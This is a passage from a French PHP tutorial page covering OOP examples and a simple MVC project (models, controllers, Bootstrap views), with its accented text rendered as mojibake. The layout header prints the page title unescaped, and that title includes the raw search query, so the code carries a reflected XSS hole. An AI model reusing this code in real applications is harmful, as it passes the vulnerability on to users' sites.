echo "Aire d'un cercle de rayon 5 = " . Mathematiques::calculerAireCircle(5) . "&lt;br&gt;";
echo "Factorielle de 5 = " . Mathematiques::factorielle(5) . "&lt;br&gt;";
echo "PI = " . Mathematiques::PI . "&lt;br&gt;";

echo "&lt;p&gt;Nombre total de calculs effectu√©s : " . Mathematiques::obtenirNombreCalculs() . "&lt;/p&gt;";

echo "&lt;h4&gt;üå°Ô∏è Conversions :&lt;/h4&gt;";
echo "25¬∞C = " . Convertisseur::celsiusVersFahrenheit(25) . "¬∞F&lt;br&gt;";
echo "100¬∞F = " . Convertisseur::fahrenheitVersCelsius(100) . "¬∞C&lt;br&gt;";
echo "10 km = " . Convertisseur::kmVersMiles(10) . " miles&lt;br&gt;";
echo "5 miles = " . Convertisseur::milesVersKm(5) . " km&lt;br&gt;";
?&gt;</code></pre>

    <h3>17.6 Exemple pratique complet : Syst√®me de gestion d'utilisateurs</h3>
    
    <h4>Classe de base et classes sp√©cialis√©es :</h4>
    <pre><code>&lt;?php
// Classe abstraite - ne peut pas √™tre instanci√©e directement
abstract class Utilisateur {
    protected $id;
    protected $nom;
    protected $email;
    protected $dateInscription;
    
    public function __construct($nom, $email) {
        $this-&gt;nom = $nom;
        $this-&gt;email = $email;
        $this-&gt;dateInscription = new DateTime();
        $this-&gt;id = uniqid();
    }
    
    // M√©thode abstraite - doit √™tre d√©finie dans les classes enfants
    abstract public function obtenirPermissions();
    
    public function obtenirNom() {
        return $this-&gt;nom;
    }
    
    public function obtenirEmail() {
        return $this-&gt;email;
    }
    
    public function obtenirId() {
        return $this-&gt;id;
    }
    
    public function seConnecter() {
        echo "üîê {$this-&gt;nom} s'est connect√©&lt;br&gt;";
    }
    
    public function seDeconnecter() {
        echo "üëã {$this-&gt;nom} s'est d√©connect√©&lt;br&gt;";
    }
}

class UtilisateurStandard extends Utilisateur {
    private $pointsFidelite = 0;
    
    public function obtenirPermissions() {
        return ['lire', 'commenter'];
    }
    
    public function ajouterPoints($points) {
        $this-&gt;pointsFidelite += $points;
        echo "‚≠ê {$this-&gt;nom} a gagn√© $points points ! Total : {$this-&gt;pointsFidelite}&lt;br&gt;";
    }
    
    public function obtenirPoints() {
        return $this-&gt;pointsFidelite;
    }
}

class Moderateur extends Utilisateur {
    private $secteurResponsabilite;
    
    public function __construct($nom, $email, $secteur) {
        parent::__construct($nom, $email);
        $this-&gt;secteurResponsabilite = $secteur;
    }
    
    public function obtenirPermissions() {
        return ['lire', 'commenter', 'moderer', 'bannir'];
    }
    
    public function modererContenu($contenu) {
        echo "üõ°Ô∏è {$this-&gt;nom} mod√®re le contenu dans le secteur {$this-&gt;secteurResponsabilite}&lt;br&gt;";
    }
    
    public function bannirUtilisateur($utilisateur) {
        echo "üö´ {$this-&gt;nom} a banni {$utilisateur-&gt;obtenirNom()}&lt;br&gt;";
    }
}

class Administrateur extends Utilisateur {
    private static $nombreAdmins = 0;
    
    public function __construct($nom, $email) {
        parent::__construct($nom, $email);
        self::$nombreAdmins++;
    }
    
    public function obtenirPermissions() {
        return ['lire', 'commenter', 'moderer', 'bannir', 'administrer', 'supprimer'];
    }
    
    public function creerUtilisateur($type, $nom, $email, $parametres = []) {
        switch ($type) {
            case 'standard':
                return new UtilisateurStandard($nom, $email);
            case 'moderateur':
                return new Moderateur($nom, $email, $parametres['secteur'] ?? 'general');
            case 'admin':
                return new Administrateur($nom, $email);
            default:
                echo "‚ùå Type d'utilisateur invalide&lt;br&gt;";
                return null;
        }
    }
    
    public function supprimerUtilisateur($utilisateur) {
        echo "üóëÔ∏è {$this-&gt;nom} a supprim√© l'utilisateur {$utilisateur-&gt;obtenirNom()}&lt;br&gt;";
    }
    
    public static function obtenirNombreAdmins() {
        return self::$nombreAdmins;
    }
}

// Utilisation du syst√®me
echo "&lt;h4&gt;üë• Cr√©ation des utilisateurs :&lt;/h4&gt;";

$admin = new Administrateur("Alice Admin", "alice@admin.com");
$moderateur = $admin-&gt;creerUtilisateur('moderateur', "Bob Modo", "bob@modo.com", ['secteur' =&gt; 'forum']);
$utilisateur1 = $admin-&gt;creerUtilisateur('standard', "Charlie User", "charlie@user.com");
$utilisateur2 = $admin-&gt;creerUtilisateur('standard', "Diana User", "diana@user.com");

echo "&lt;h4&gt;üîê Connexions :&lt;/h4&gt;";
$admin-&gt;seConnecter();
$moderateur-&gt;seConnecter();
$utilisateur1-&gt;seConnecter();

echo "&lt;h4&gt;üéØ Actions utilisateurs :&lt;/h4&gt;";
$utilisateur1-&gt;ajouterPoints(100);
$utilisateur1-&gt;ajouterPoints(50);

echo "&lt;h4&gt;üõ°Ô∏è Actions mod√©ration :&lt;/h4&gt;";
$moderateur-&gt;modererContenu("Message suspect");
$moderateur-&gt;bannirUtilisateur($utilisateur2);

echo "&lt;h4&gt;‚öôÔ∏è Actions administration :&lt;/h4&gt;";
$nouveauModo = $admin-&gt;creerUtilisateur('moderateur', "Eve Modo", "eve@modo.com", ['secteur' =&gt; 'blog']);

echo "&lt;h4&gt;üìä Permissions :&lt;/h4&gt;";
echo "Permissions d'Alice (admin) : " . implode(', ', $admin-&gt;obtenirPermissions()) . "&lt;br&gt;";
echo "Permissions de Bob (modo) : " . implode(', ', $moderateur-&gt;obtenirPermissions()) . "&lt;br&gt;";
echo "Permissions de Charlie (user) : " . implode(', ', $utilisateur1-&gt;obtenirPermissions()) . "&lt;br&gt;";

echo "&lt;p&gt;Nombre total d'administrateurs : " . Administrateur::obtenirNombreAdmins() . "&lt;/p&gt;";
?&gt;</code></pre>
       </section>
       <section>
        <!-- Partie 19: Architecture MVC simplifi√©e -->
<section class="part19">
    <h2>19. Architecture MVC simplifi√©e</h2>
    
    <p>Le <strong>MVC</strong> (Model-View-Controller) n'est pas juste un acronyme compliqu√©, c'est comme <strong>organiser sa maison</strong> ! Imaginez que vous ne rangez jamais : v√™tements dans la cuisine, nourriture dans la chambre, livres dans la salle de bain... C'est le chaos ! Le MVC, c'est ranger votre code dans les bonnes "pi√®ces" pour que tout soit clair et facile √† maintenir.</p>

    <p><strong>MVC = Organisation + Clart√© + Productivit√©</strong></p>

    <h3>19.1 Comprendre le pattern MVC</h3>
    
    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
        <h4>üè† Analogie avec un restaurant :</h4>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0;">
            <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; border-left: 4px solid #2196f3;">
                <h5>üë®‚Äçüç≥ MODEL (Mod√®le)</h5>
                <p><strong>= La cuisine</strong></p>
                <ul>
                    <li>Pr√©pare les donn√©es</li>
                    <li>G√®re la base de donn√©es</li>
                    <li>R√®gles m√©tier</li>
                    <li>Calculs et traitements</li>
                </ul>
            </div>
            
            <div style="background: #f3e5f5; padding: 15px; border-radius: 8px; border-left: 4px solid #9c27b0;">
                <h5>üé® VIEW (Vue)</h5>
                <p><strong>= La salle √† manger</strong></p>
                <ul>
                    <li>Pr√©sentation finale</li>
                    <li>Interface utilisateur</li>
                    <li>HTML, CSS, JavaScript</li>
                    <li>Affichage des donn√©es</li>
                </ul>
            </div>
            
            <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; border-left: 4px solid #4caf50;">
                <h5>üéØ CONTROLLER (Contr√¥leur)</h5>
                <p><strong>= Le serveur</strong></p>
                <ul>
                    <li>Prend les commandes</li>
                    <li>Coordonne tout</li>
                    <li>G√®re les demandes</li>
                    <li>Fait le lien M ‚Üî V</li>
                </ul>
            </div>
        </div>
    </div>

    <h4>Flux de donn√©es dans MVC :</h4>
    <pre style="background: #263238; color: #eceff1; padding: 20px; border-radius: 8px;">
    üë§ Utilisateur    ‚Üí    üéØ Controller    ‚Üí    üë®‚Äçüç≥ Model
         ‚Üë                      ‚Üì                    ‚Üì
    üé® View          ‚Üê    üìä Donn√©es         ‚Üê    üóÑÔ∏è Database</pre>

    <h3>19.2 Structure d'un projet MVC simple</h3>
    
    <h4>Organisation des dossiers :</h4>
    <pre><code>mon-projet-mvc/
‚îú‚îÄ‚îÄ index.php              // Point d'entr√©e
‚îú‚îÄ‚îÄ config/
‚îÇ   ‚îî‚îÄ‚îÄ database.php       // Configuration DB
‚îú‚îÄ‚îÄ controllers/           // üéØ Contr√¥leurs
‚îÇ   ‚îú‚îÄ‚îÄ HomeController.php
‚îÇ   ‚îú‚îÄ‚îÄ ProductController.php
‚îÇ   ‚îî‚îÄ‚îÄ UserController.php
‚îú‚îÄ‚îÄ models/               // üë®‚Äçüç≥ Mod√®les
‚îÇ   ‚îú‚îÄ‚îÄ Product.php
‚îÇ   ‚îú‚îÄ‚îÄ User.php
‚îÇ   ‚îî‚îÄ‚îÄ Database.php
‚îú‚îÄ‚îÄ views/                // üé® Vues
‚îÇ   ‚îú‚îÄ‚îÄ layouts/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ header.php
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ footer.php
‚îÇ   ‚îú‚îÄ‚îÄ home/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ index.php
‚îÇ   ‚îú‚îÄ‚îÄ products/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ index.php
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ show.php
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ create.php
‚îÇ   ‚îî‚îÄ‚îÄ users/
‚îÇ       ‚îú‚îÄ‚îÄ login.php
‚îÇ       ‚îî‚îÄ‚îÄ profile.php
‚îú‚îÄ‚îÄ public/               // Fichiers publics
‚îÇ   ‚îú‚îÄ‚îÄ css/
‚îÇ   ‚îú‚îÄ‚îÄ js/
‚îÇ   ‚îî‚îÄ‚îÄ images/
‚îî‚îÄ‚îÄ core/                 // Classes syst√®me
    ‚îú‚îÄ‚îÄ Router.php
    ‚îú‚îÄ‚îÄ Controller.php
    ‚îî‚îÄ‚îÄ Model.php</code></pre>

    <h3>19.3 Le Mod√®le - Gestion des donn√©es</h3>
    
    <h4>Classe de base pour tous les mod√®les :</h4>
    <pre><code>&lt;?php
// core/Model.php
abstract class Model {
    protected $db;
    protected $table;
    
    public function __construct() {
        $this-&gt;db = Database::getInstance()-&gt;getConnection();
    }
    
    // M√©thodes de base pour tous les mod√®les
    public function findAll() {
        $sql = "SELECT * FROM {$this-&gt;table} ORDER BY id DESC";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute();
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function findById($id) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE id = :id";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $id]);
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
    
    public function create(array $data) {
        $columns = implode(',', array_keys($data));
        $placeholders = ':' . implode(', :', array_keys($data));
        
        $sql = "INSERT INTO {$this-&gt;table} ($columns) VALUES ($placeholders)";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute($data);
        
        return $this-&gt;db-&gt;lastInsertId();
    }
    
    public function update($id, array $data) {
        $setParts = [];
        foreach (array_keys($data) as $key) {
            $setParts[] = "$key = :$key";
        }
        $setClause = implode(', ', $setParts);
        
        $sql = "UPDATE {$this-&gt;table} SET $setClause WHERE id = :id";
        $data[':id'] = $id;
        
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute($data);
    }
    
    public function delete($id) {
        $sql = "DELETE FROM {$this-&gt;table} WHERE id = :id";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute([':id' =&gt; $id]);
    }
}

// models/Product.php
class Product extends Model {
    protected $table = 'products';
    
    // M√©thodes sp√©cifiques aux produits
    public function findByCategory($categoryId) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE category_id = :category_id ORDER BY name";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':category_id' =&gt; $categoryId]);
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function search($term) {
        $sql = "SELECT * FROM {$this-&gt;table} 
                WHERE name LIKE :term OR description LIKE :term 
                ORDER BY name";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':term' =&gt; "%$term%"]);
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function updateStock($id, $quantity) {
        $sql = "UPDATE {$this-&gt;table} SET stock = stock - :quantity 
                WHERE id = :id AND stock &gt;= :quantity";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute([
            ':id' =&gt; $id,
            ':quantity' =&gt; $quantity
        ]);
    }
    
    public function getStatistics() {
        $sql = "SELECT 
                    COUNT(*) as total_products,
                    AVG(price) as average_price,
                    SUM(stock) as total_stock
                FROM {$this-&gt;table}";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute();
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
}

// models/User.php
class User extends Model {
    protected $table = 'users';
    
    public function findByEmail($email) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE email = :email";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
    
    public function createUser($name, $email, $password) {
        $data = [
            'name' =&gt; $name,
            'email' =&gt; $email,
            'password' =&gt; password_hash($password, PASSWORD_DEFAULT),
            'created_at' =&gt; date('Y-m-d H:i:s')
        ];
        
        return $this-&gt;create($data);
    }
    
    public function authenticate($email, $password) {
        $user = $this-&gt;findByEmail($email);
        
        if ($user && password_verify($password, $user['password'])) {
            return $user;
        }
        
        return false;
    }
}
?&gt;</code></pre>

    <h3>19.4 Le Contr√¥leur - Chef d'orchestre</h3>
    
    <h4>Classe de base pour les contr√¥leurs :</h4>
    <pre><code>&lt;?php
// core/Controller.php
abstract class Controller {
    
    // Charger une vue avec des donn√©es
    protected function view($viewName, $data = []) {
        // Extraire les donn√©es pour les rendre disponibles dans la vue
        extract($data);
        
        // Charger le header
        include_once 'views/layouts/header.php';
        
        // Charger la vue demand√©e
        $viewFile = "views/$viewName.php";
        if (file_exists($viewFile)) {
            include_once $viewFile;
        } else {
            throw new Exception("Vue $viewName non trouv√©e");
        }
        
        // Charger le footer
        include_once 'views/layouts/footer.php';
    }
    
    // Redirection
    protected function redirect($url) {
        header("Location: $url");
        exit;
    }
    
    // R√©ponse JSON pour les API
    protected function json($data, $status = 200) {
        http_response_code($status);
        header('Content-Type: application/json');
        echo json_encode($data);
        exit;
    }
    
    // Valider les donn√©es POST/GET
    protected function validate($data, $rules) {
        $errors = [];
        
        foreach ($rules as $field =&gt; $rule) {
            if ($rule['required'] && empty($data[$field])) {
                $errors[$field] = "Le champ $field est obligatoire";
                continue;
            }
            
            if (!empty($data[$field])) {
                // Validation email
                if (isset($rule['email']) && !filter_var($data[$field], FILTER_VALIDATE_EMAIL)) {
                    $errors[$field] = "Format email invalide";
                }
                
                // Validation longueur minimale
                if (isset($rule['min']) && strlen($data[$field]) &lt; $rule['min']) {
                    $errors[$field] = "Le champ $field doit faire au moins {$rule['min']} caract√®res";
                }
                
                // Validation longueur maximale
                if (isset($rule['max']) && strlen($data[$field]) &gt; $rule['max']) {
                    $errors[$field] = "Le champ $field ne peut pas d√©passer {$rule['max']} caract√®res";
                }
            }
        }
        
        return $errors;
    }
}

// controllers/ProductController.php
class ProductController extends Controller {
    private $productModel;
    
    public function __construct() {
        $this-&gt;productModel = new Product();
    }
    
    // GET /products - Liste des produits
    public function index() {
        $search = $_GET['search'] ?? '';
        
        if ($search) {
            $products = $this-&gt;productModel-&gt;search($search);
            $title = "R√©sultats pour '$search'";
        } else {
            $products = $this-&gt;productModel-&gt;findAll();
            $title = "Tous nos produits";
        }
        
        $this-&gt;view('products/index', [
            'products' =&gt; $products,
            'title' =&gt; $title,
            'search' =&gt; $search
        ]);
    }
    
    // GET /products/show/5 - D√©tail d'un produit
    public function show() {
        $id = $_GET['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouv√©');
        }
        
        $this-&gt;view('products/show', [
            'product' =&gt; $product,
            'title' =&gt; $product['name']
        ]);
    }
    
    // GET /products/create - Formulaire de cr√©ation
    public function create() {
        $this-&gt;view('products/create', [
            'title' =&gt; 'Nouveau produit'
        ]);
    }
    
    // POST /products/store - Enregistrer un nouveau produit
    public function store() {
        $rules = [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2, 'max' =&gt; 255],
            'description' =&gt; ['required' =&gt; true, 'min' =&gt; 10],
            'price' =&gt; ['required' =&gt; true],
            'stock' =&gt; ['required' =&gt; true]
        ];
        
        $errors = $this-&gt;validate($_POST, $rules);
        
        if (empty($errors)) {
            // Validation sp√©cifique
            if (!is_numeric($_POST['price']) || $_POST['price'] &lt;= 0) {
                $errors['price'] = 'Le prix doit √™tre un nombre positif';
            }
            
            if (!is_numeric($_POST['stock']) || $_POST['stock'] &lt; 0) {
                $errors['stock'] = 'Le stock doit √™tre un nombre positif ou z√©ro';
            }
        }
        
        if (!empty($errors)) {
            $this-&gt;view('products/create', [
                'title' =&gt; 'Nouveau produit',
                'errors' =&gt; $errors,
                'old' =&gt; $_POST
            ]);
            return;
        }
        
        // Cr√©er le produit
        $productData = [
            'name' =&gt; htmlspecialchars($_POST['name']),
            'description' =&gt; htmlspecialchars($_POST['description']),
            'price' =&gt; floatval($_POST['price']),
            'stock' =&gt; intval($_POST['stock']),
            'created_at' =&gt; date('Y-m-d H:i:s')
        ];
        
        $productId = $this-&gt;productModel-&gt;create($productData);
        
        $this-&gt;redirect("/products/show?id=$productId&amp;success=Produit cr√©√© avec succ√®s");
    }
    
    // GET /products/edit/5 - Formulaire d'√©dition
    public function edit() {
        $id = $_GET['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouv√©');
        }
        
        $this-&gt;view('products/edit', [
            'product' =&gt; $product,
            'title' =&gt; 'Modifier ' . $product['name']
        ]);
    }
    
    // POST /products/update/5 - Mettre √† jour un produit
    public function update() {
        $id = $_POST['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouv√©');
        }
        
        // M√™me validation que pour create
        $rules = [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2, 'max' =&gt; 255],
            'description' =&gt; ['required' =&gt; true, 'min' =&gt; 10],
            'price' =&gt; ['required' =&gt; true],
            'stock' =&gt; ['required' =&gt; true]
        ];
        
        $errors = $this-&gt;validate($_POST, $rules);
        
        if (empty($errors)) {
            $updateData = [
                'name' =&gt; htmlspecialchars($_POST['name']),
                'description' =&gt; htmlspecialchars($_POST['description']),
                'price' =&gt; floatval($_POST['price']),
                'stock' =&gt; intval($_POST['stock']),
                'updated_at' =&gt; date('Y-m-d H:i:s')
            ];
            
            $this-&gt;productModel-&gt;update($id, $updateData);
            
            $this-&gt;redirect("/products/show?id=$id&amp;success=Produit modifi√© avec succ√®s");
        } else {
            $this-&gt;view('products/edit', [
                'product' =&gt; $product,
                'title' =&gt; 'Modifier ' . $product['name'],
                'errors' =&gt; $errors,
                'old' =&gt; $_POST
            ]);
        }
    }
    
    // POST /products/delete/5 - Supprimer un produit
    public function delete() {
        $id = $_POST['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if ($product) {
            $this-&gt;productModel-&gt;delete($id);
            $this-&gt;redirect('/products?success=Produit supprim√© avec succ√®s');
        } else {
            $this-&gt;redirect('/products?error=Produit non trouv√©');
        }
    }
    
    // API endpoint - Retourner du JSON
    public function api() {
        $products = $this-&gt;productModel-&gt;findAll();
        $this-&gt;json($products);
    }
}

// controllers/HomeController.php
class HomeController extends Controller {
    
    public function index() {
        $productModel = new Product();
        $userModel = new User();
        
        // Donn√©es pour la page d'accueil
        $stats = $productModel-&gt;getStatistics();
        $latestProducts = array_slice($productModel-&gt;findAll(), 0, 6);
        
        $this-&gt;view('home/index', [
            'title' =&gt; 'Accueil',
            'stats' =&gt; $stats,
            'latestProducts' =&gt; $latestProducts
        ]);
    }
    
    public function about() {
        $this-&gt;view('home/about', [
            'title' =&gt; '√Ä propos'
        ]);
    }
    
    public function contact() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Traiter le formulaire de contact
            $rules = [
                'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2],
                'email' =&gt; ['required' =&gt; true, 'email' =&gt; true],
                'message' =&gt; ['required' =&gt; true, 'min' =&gt; 10]
            ];
            
            $errors = $this-&gt;validate($_POST, $rules);
            
            if (empty($errors)) {
                // Ici on pourrait envoyer un email ou sauvegarder en BDD
                $this-&gt;view('home/contact', [
                    'title' =&gt; 'Contact',
                    'success' =&gt; 'Message envoy√© avec succ√®s !'
                ]);
                return;
            }
        }
        
        $this-&gt;view('home/contact', [
            'title' =&gt; 'Contact',
            'errors' =&gt; $errors ?? [],
            'old' =&gt; $_POST ?? []
        ]);
    }
}
?&gt;</code></pre>

    <h3>19.5 Les Vues - Interface utilisateur</h3>
    
    <h4>Template de base (layouts) :</h4>
    <pre><code>&lt;?php
// views/layouts/header.php
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang="fr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;&lt;?= isset($title) ? $title . ' - ' : '' ?&gt;Mon Site MVC&lt;/title&gt;
    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
    &lt;link href="/public/css/style.css" rel="stylesheet"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-primary"&gt;
        &lt;div class="container"&gt;
            &lt;a class="navbar-brand" href="/"&gt;üè™ Mon Site MVC&lt;/a&gt;
            
            &lt;button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"&gt;
                &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
            &lt;/button&gt;
            
            &lt;div class="collapse navbar-collapse" id="navbarNav"&gt;
                &lt;ul class="navbar-nav me-auto"&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/"&gt;üè† Accueil&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/products"&gt;üì¶ Produits&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/contact"&gt;üìß Contact&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
                
                &lt;ul class="navbar-nav"&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/login"&gt;üîê Connexion&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/nav&gt;
    
    &lt;main class="container mt-4"&gt;
        &lt;!-- Messages flash --&gt;
        &lt;?php if (isset($_GET['success'])): ?&gt;
            &lt;div class="alert alert-success alert-dismissible fade show"&gt;
                &lt;?= htmlspecialchars($_GET['success']) ?&gt;
                &lt;button type="button" class="btn-close" data-bs-dismiss="alert"&gt;&lt;/button&gt;
            &lt;/div&gt;
        &lt;?php endif; ?&gt;
        
        &lt;?php if (isset($_GET['error'])): ?&gt;
            &lt;div class="alert alert-danger alert-dismissible fade show"&gt;
                &lt;?= htmlspecialchars($_GET['error']) ?&gt;
                &lt;button type="button" class="btn-close" data-bs-dismiss="alert"&gt;&lt;/button&gt;
            &lt;/div&gt;
        &lt;?php endif; ?&gt;

&lt;?php
// views/layouts/footer.php
?&gt;
    &lt;/main&gt;
    
    &lt;footer class="bg-dark text-light mt-5 py-4"&gt;
        &lt;div class="container text-center"&gt;
            &lt;p&gt;&amp;copy; 2024 Mon Site MVC - Fait avec ‚ù§Ô∏è et PHP&lt;/p&gt;
            &lt;p&gt;
                &lt;a href="/about" class="text-light"&gt;√Ä propos&lt;/a&gt; | 
                &lt;a href="/contact" class="text-light"&gt;Contact&lt;/a&gt; | 
                &lt;a href="/products" class="text-light"&gt;Produits&lt;/a&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/footer&gt;
    
    &lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
    &lt;script src="/public/js/app.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>Vues sp√©cifiques :</h4>
    <pre><code>&lt;?php
// views/home/index.php
?&gt;
&lt;div class="hero-section bg-primary text-white text-center py-5 mb-5 rounded"&gt;
    &lt;h1 class="display-4"&gt;üöÄ Bienvenue sur Mon Site MVC&lt;/h1&gt;
    &lt;p class="lead"&gt;D√©couvrez notre s√©lection de produits organis√©s avec l'architecture MVC&lt;/p&gt;
    &lt;a href="/products" class="btn btn-light btn-lg"&gt;üì¶ Voir nos produits&lt;/a&gt;
&lt;/div&gt;

&lt;div class="row mb-5"&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-info text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;üìä Total Produits&lt;/h5&gt;
                &lt;h2&gt;&lt;?= $stats['total_products'] ?&gt;&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-success text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;üì¶ Stock Total&lt;/h5&gt;
                &lt;h2&gt;&lt;?= number_format($stats['total_stock']) ?&gt;&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-warning text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;üí∞ Prix Moyen&lt;/h5&gt;
                &lt;h2&gt;&lt;?= number_format($stats['average_price'], 2) ?&gt;‚Ç¨&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;h2&gt;üÜï Derniers Produits&lt;/h2&gt;
&lt;div class="row"&gt;
    &lt;?php foreach ($latestProducts as $product): ?&gt;
        &lt;div class="col-md-4 mb-4"&gt;
            &lt;div class="card h-100"&gt;
                &lt;div class="card-body"&gt;
                    &lt;h5 class="card-title"&gt;&lt;?= htmlspecialchars($product['name']) ?&gt;&lt;/h5&gt;
                    &lt;p class="card-text"&gt;&lt;?= htmlspecialchars(substr($product['description'], 0, 100)) ?&gt;...&lt;/p&gt;
                    &lt;p class="text-primary fw-bold"&gt;&lt;?= number_format($product['price'], 2) ?&gt;‚Ç¨&lt;/p&gt;
                &lt;/div&gt;
                &lt;div class="card-footer"&gt;
                    &lt;a href="/products/show?id=&lt;?= $product['id'] ?&gt;" class="btn btn-primary"&gt;Voir d√©tails&lt;/a&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;?php endforeach; ?&gt;
&lt;/div&gt;

&lt;?php
// views/products/index.php
?&gt;
&lt;div class="d-flex justify-content-between align-items-center mb-4"&gt;
    &lt;h1&gt;&lt;?= htmlspecialchars($title) ?&gt;&lt;/h1&gt;
    &lt;a href="/products/create" class="btn btn-primary"&gt;‚ûï Nouveau produit&lt;/a&gt;
&lt;/div&gt;

&lt;!-- Barre de recherche --&gt;
&lt;div class="card mb-4"&gt;
    &lt;div class="card-body"&gt;
        &lt;form method="GET" action="/products" class="d-flex"&gt;
            &lt;input type="text" name="search" class="form-control me-2" 
                   placeholder="Rechercher un produit..." 
                   value="&lt;?= htmlspecialchars($search) ?&gt;"&gt;
            &lt;button type="submit" class="btn btn-outline-primary"&gt;üîç Rechercher&lt;/button&gt;
            &lt;?php if ($search): ?&gt;
                &lt;a href="/products" class="btn btn-outline-secondary ms-2"&gt;‚ùå Reset&lt;/a&gt;
            &lt;?php endif; ?&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;!-- Liste des produits --&gt;
&lt;?php if (empty($products)): ?&gt;
    &lt;div class="alert alert-info text-center"&gt;
        &lt;h4&gt;Aucun produit trouv√©&lt;/h4&gt;
        &lt;p&gt;Aucun produit ne correspond √† votre recherche.&lt;/p&gt;
        &lt;a href="/products/create" class="btn btn-primary"&gt;Ajouter le premier produit&lt;/a&gt;
    &lt;/div&gt;
&lt;?php else: ?&gt;
    &lt;div class="row"&gt;
        &lt;?php foreach ($products as $product): ?&gt;
            &lt;div class="col-md-6 col-lg-4 mb-4"&gt;
                &lt;div class="card h-100"&gt;
                    &lt;div class="card-body"&gt;
                        &lt;h5 class="card-title"&gt;&lt;?= htmlspecialchars($product['name']) ?&gt;&lt;/h5&gt;
                        &lt;p class="card-text"&gt;&lt;?= htmlspecialchars(substr($product['description'], 0, 100)) ?&gt;...&lt;/p&gt;
                        &lt;div class="d-flex justify-content-between align-items-center"&gt;
                            &lt;span class="text-primary fw-bold fs-5"&gt;&lt;?= number_format($product['price'], 2) ?&gt;‚Ç¨&lt;/span&gt;
                            &lt;small class="text-muted"&gt;Stock: &lt;?= $product['stock'] ?&gt;&lt;/small&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
